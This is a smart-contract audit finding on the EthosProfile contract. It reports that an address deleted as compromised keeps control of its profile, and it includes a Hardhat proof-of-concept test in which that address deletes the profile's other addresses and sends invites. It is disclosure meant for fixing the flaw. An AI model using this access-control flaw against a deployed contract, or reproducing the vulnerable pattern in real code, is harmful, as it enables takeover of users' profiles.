# Compromised Address Retains Control of Profile in EthosProfile Contract

### Summary

In EthosProfile contract a compromised account can still perform legitimate profile actions after being deleted. This allows the compromised address to manipulate profile invitations, delete other legitimate addresses, add reviews and other actions they shouldn't be allowed.

### Root Cause

In EthosProfile.sol, the deleteAddressAtIndex function marks an address as compromised without fully revoking its control over the profile, allowing it to continue making legitimate actions.
When user deletes a compromised address, `isAddressCompromised` is updated and address is removed from  `profiles[profileId].addresses` array. But when the compromised address  use ethos contracts there is no check for this updated values only `profileIdByAddress` is checked if the profile is legitimate. This allows compromised account to retain its control.

```solidity
  function deleteAddressAtIndex(uint256 addressIndex) external whenNotPaused {
    uint256 profileId = profileIdByAddress[msg.sender];

    //***

    isAddressCompromised[addressStr] = true;
    _addressShouldDifferFromSender(addressStr);

    _deleteAddressAtIndexFromArray(addressIndex, addresses, removedAddresses);
```

### Internal pre-conditions

1. A user must have registered an address with their profile ID.
2. The user must mark an address as compromised and call deleteAddressAtIndex to delete the address.
3. The deleted compromised address retain its control privileges.

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Despite deletion, the compromised address retains privileges, allowing it to:
- Delete other legitimate addresses from the profile.
- Invite arbitrary or empty addresses, filling the invite limit and preventing legitimate invitations.
- Voting or adding reviews 


### PoC

```js
    it('AddressCompromised can still controll', async () => {
      const { ethosProfile, ADMIN, PROFILE_CREATOR_0, EXPECTED_SIGNER, OTHER_0, OTHER_1, OWNER,  } =
        await loadFixture(deployFixture);

      const profileId = String(2);
      let rand = '123';
      let signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );

      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_0.address);

      await ethosProfile.connect(PROFILE_CREATOR_0).createProfile(1);

      await ethosProfile.connect(ADMIN).addInvites(PROFILE_CREATOR_0.address, 10);

      await ethosProfile
        .connect(PROFILE_CREATOR_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);

      rand = '456';
      signature = await common.signatureForRegisterAddress(
        OTHER_1.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );
      await ethosProfile
        .connect(PROFILE_CREATOR_0)
        .registerAddress(OTHER_1.address, profileId, rand, signature);

      let addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(3, 'should be 3 addresses');

      // delete address at index 2
      await ethosProfile.connect(PROFILE_CREATOR_0).deleteAddressAtIndex(2);

      addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(2, 'should be 2 addresses');
      expect(addresses[0]).to.be.equal(PROFILE_CREATOR_0.address, 'wrong address[0]');
      expect(addresses[1]).to.be.equal(OTHER_0.address, 'wrong address[1]');
      let isCompromised = await ethosProfile.isAddressCompromised(OTHER_1);
      expect(isCompromised).to.be.equal(true, 'wrong address[1]');

      // OTHER_1 is comprimised and removed but can still control the account
      // @audit can remove other address
      await ethosProfile.connect(OTHER_1).deleteAddressAtIndex(0);
      await ethosProfile.connect(OTHER_1).deleteAddressAtIndex(0);
      addresses = await ethosProfile.addressesForProfile(2);

      expect(addresses.length).to.be.equal(0, 'should be 0 addresses');
      //@audit can invite new users
      await ethosProfile.connect(OTHER_1).inviteAddress(EXPECTED_SIGNER);

    });
```
### Mitigation

Either compromised address should be deleted from  `profileIdByAddress`  or there should be checks compromised address check for profile actions
